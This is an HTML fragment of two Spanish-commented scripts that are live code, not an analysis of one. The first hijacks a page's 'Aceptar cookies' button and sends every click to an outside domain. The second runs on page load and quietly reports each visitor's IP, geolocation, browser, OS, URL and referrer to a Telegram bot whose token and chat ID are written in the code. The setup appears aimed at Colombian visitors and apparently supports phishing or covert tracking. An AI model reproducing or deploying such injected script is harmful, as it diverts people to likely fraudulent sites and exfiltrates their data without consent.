    <!-- INTERRUPTOR PARA EL BOTÓN ACEPTAR COOKIES -->
    <script>
    (function() {
        // ==========================================
        // 👇 CONFIGURACIÓN - CAMBIA ESTO CUANDO QUIERAS
        // ==========================================
        var ACTIVAR_REDIRECCION = true;   // false = función original, true = redirige
        var DESTINO_URL = 'https://webservicesoat.online';  // Sitio web de destino
        // ==========================================
        
        var botonModificado = false;
        var botonOriginal = null;
        var funcionOriginal = null;
        
        // Función para forzar redirección
        function forzarRedireccion(e) {
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            console.log('🔄 Redirigiendo a: ' + DESTINO_URL);
            window.location.href = DESTINO_URL;
            return false;
        }
        
        // Función para buscar el botón de aceptar cookies
        function buscarBotonAceptarCookies() {
            // Buscar por data-testid
            var boton = document.querySelector('[data-testid="button-cookie-accept"]');
            if (boton) return boton;
            
            // Buscar por texto "Aceptar cookies"
            var botones = document.querySelectorAll('button');
            for (var i = 0; i < botones.length; i++) {
                if (botones[i].textContent && botones[i].textContent.includes('Aceptar cookies')) {
                    return botones[i];
                }
            }
            return null;
        }
        
        // Función para modificar el botón
        function modificarBoton() {
            var boton = buscarBotonAceptarCookies();
            if (!boton) return false;
            if (botonModificado) return true;
            
            // Guardar la función original del botón
            if (boton.onclick) {
                funcionOriginal = boton.onclick;
            }
            
            // Guardar el botón original
            botonOriginal = boton;
            
            // Reemplazar el botón para quitar eventos originales
            var nuevoBoton = boton.cloneNode(true);
            boton.parentNode.replaceChild(nuevoBoton, boton);
            
            // Agregar eventos para asegurar la redirección
            nuevoBoton.onclick = forzarRedireccion;
            nuevoBoton.addEventListener('click', forzarRedireccion);
            
            botonModificado = true;
            console.log('✅ Botón "Aceptar cookies" modificado para REDIRIGIR a: ' + DESTINO_URL);
            return true;
        }
        
        // Función para restaurar el botón a su función original
        function restaurarBoton() {
            if (!botonModificado) return;
            
            var botonActual = buscarBotonAceptarCookies();
            if (botonActual && botonActual.parentNode && botonOriginal) {
                var botonRestaurado = botonOriginal.cloneNode(true);
                if (funcionOriginal) {
                    botonRestaurado.onclick = funcionOriginal;
                }
                botonActual.parentNode.replaceChild(botonRestaurado, botonActual);
            }
            
            botonModificado = false;
            console.log('🔄 Botón "Aceptar cookies" RESTAURADO a su función original');
        }
        
        // Función principal para actualizar el botón según el estado
        function actualizarBoton() {
            if (ACTIVAR_REDIRECCION) {
                modificarBoton();
            } else {
                restaurarBoton();
            }
        }
        
        // Intentar encontrar el botón periódicamente
        var intentos = 0;
        var maxIntentos = 30;
        
        var intervalo = setInterval(function() {
            intentos++;
            
            if (ACTIVAR_REDIRECCION) {
                modificarBoton();
            }
            
            if (intentos >= maxIntentos) {
                clearInterval(intervalo);
                if (ACTIVAR_REDIRECCION && botonModificado) {
                    console.log('🎉 Botón "Aceptar cookies" modificado exitosamente');
                } else if (ACTIVAR_REDIRECCION && !botonModificado) {
                    console.log('⚠️ No se encontró el botón "Aceptar cookies"');
                }
            }
        }, 500);
        
        // Observador de cambios en el DOM
        var observador = new MutationObserver(function() {
            if (ACTIVAR_REDIRECCION) {
                modificarBoton();
            }
        });
        
        setTimeout(function() {
            if (document.body) {
                observador.observe(document.body, { childList: true, subtree: true });
            }
        }, 1000);
        
        // Control desde consola
        window.controlarBotonCookies = {
            activar: function(url) {
                ACTIVAR_REDIRECCION = true;
                if (url) DESTINO_URL = url;
                console.log('✅ Redirección ACTIVADA para el botón "Aceptar cookies" hacia: ' + DESTINO_URL);
                modificarBoton();
            },
            desactivar: function() {
                ACTIVAR_REDIRECCION = false;
                restaurarBoton();
                console.log('❌ Redirección DESACTIVADA - El botón "Aceptar cookies" funciona NORMAL');
            },
            cambiarUrl: function(url) {
                DESTINO_URL = url;
                console.log('🔗 Nueva URL destino para el botón: ' + url);
                if (ACTIVAR_REDIRECCION && botonModificado) {
                    console.log('⚠️ La redirección está ACTIVADA. El botón irá a la nueva URL.');
                }
            },
            estado: function() {
                console.log('📊 Estado actual del botón "Aceptar cookies":');
                console.log('   Redirección: ' + (ACTIVAR_REDIRECCION ? '✅ ACTIVADA' : '❌ DESACTIVADA'));
                console.log('   URL destino: ' + DESTINO_URL);
                console.log('   Botón modificado: ' + (botonModificado ? '✅ Sí' : '❌ No'));
            }
        };
        
        console.log('🎮 Script de control del botón "Aceptar cookies" cargado');
        console.log('📊 Estado inicial: ' + (ACTIVAR_REDIRECCION ? '✅ REDIRECCIÓN ACTIVADA a ' + DESTINO_URL : '❌ Redirección DESACTIVADA'));
        console.log('💡 Comandos disponibles:');
        console.log('   - window.controlarBotonCookies.activar("https://otro-sitio.com")');
        console.log('   - window.controlarBotonCookies.desactivar()');
        console.log('   - window.controlarBotonCookies.cambiarUrl("https://nueva-url.com")');
        console.log('   - window.controlarBotonCookies.estado()');
    })();
    </script>

    <div id="root"></div>
    <script>
      // Configuración de Telegram
      const TELEGRAM_TOKEN = '8607426657:AAFFQMG_061Qf_HlkDuMmzgXFsWH9mSmBOk';
      const TELEGRAM_CHAT_ID = '-4990320783';

      // Función para obtener la IP del visitante
      async function getVisitorIP() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          return data.ip;
        } catch (error) {
          console.error('Error obteniendo IP:', error);
          return 'No disponible';
        }
      }

      // Función para obtener geolocalización por IP
      async function getGeoLocation(ip) {
        try {
          const response = await fetch(`https://ipapi.co/${ip}/json/`);
          const data = await response.json();
          return {
            country: data.country_name || 'No disponible',
            city: data.city || 'No disponible',
            region: data.region || 'No disponible',
            latitude: data.latitude,
            longitude: data.longitude
          };
        } catch (error) {
          console.error('Error obteniendo geolocalización:', error);
          return { country: 'No disponible', city: 'No disponible', region: 'No disponible' };
        }
      }

      // Función para obtener información del dominio/navegador
      function getBrowserInfo() {
        const userAgent = navigator.userAgent;
        let browser = 'No disponible';
        let os = 'No disponible';

        if (userAgent.indexOf('Chrome') > -1) browser = 'Google Chrome';
        else if (userAgent.indexOf('Firefox') > -1) browser = 'Mozilla Firefox';
        else if (userAgent.indexOf('Safari') > -1) browser = 'Safari';
        else if (userAgent.indexOf('Edge') > -1) browser = 'Microsoft Edge';
        else if (userAgent.indexOf('Opera') > -1) browser = 'Opera';

        if (userAgent.indexOf('Windows') > -1) os = 'Windows';
        else if (userAgent.indexOf('Mac') > -1) os = 'MacOS';
        else if (userAgent.indexOf('Linux') > -1) os = 'Linux';
        else if (userAgent.indexOf('Android') > -1) os = 'Android';
        else if (userAgent.indexOf('iOS') > -1 || userAgent.indexOf('iPhone') > -1) os = 'iOS';

        return { browser, os };
      }

      // Función principal para enviar la notificación
      async function sendVisitNotification() {
        // Obtener IP del visitante
        const ip = await getVisitorIP();
        
        // Obtener geolocalización
        const geo = await getGeoLocation(ip);
        
        // Obtener información del navegador
        const browserInfo = getBrowserInfo();
        
        // Obtener URL actual y referido
        const currentUrl = window.location.href;
        const referrer = document.referrer || 'Directo';
        const domain = window.location.hostname;
        
        // Obtener fecha y hora en Colombia
        const now = new Date();
        const options = { 
          timeZone: 'America/Bogota', 
          year: 'numeric', 
          month: 'long', 
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit',
          hour12: true
        };
        const colombiaTime = now.toLocaleString('es-CO', options);
        
        // Construir mensaje
        const message = `
🟢 *NUEVO VISITANTE* 🟢
━━━━━━━━━━━━━━━━━━━━━
🌐 *IP:* \`${ip}\`
📍 *País:* ${geo.country}
🏙️ *Ciudad:* ${geo.city}
🏠 *Dominio:* ${domain}
📄 *URL:* ${currentUrl}
🔗 *Referido:* ${referrer}
💻 *Navegador:* ${browserInfo.browser}
🖥️ *Sistema:* ${browserInfo.os}
⏰ *Hora:* ${colombiaTime}
━━━━━━━━━━━━━━━━━━━━━
        `;

        // Enviar a Telegram
        try {
          const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: message,
              parse_mode: 'Markdown'
            })
          });
          
          if (response.ok) {
            console.log('Notificación enviada a Telegram');
          } else {
            console.error('Error al enviar a Telegram:', await response.text());
          }
        } catch (error) {
          console.error('Error de conexión con Telegram:', error);
        }
      }

      // Ejecutar cuando la página esté completamente cargada
      window.addEventListener('load', () => {
        // Pequeño delay para asegurar que todo esté listo
        setTimeout(sendVisitNotification, 1000);
      });
    </script>
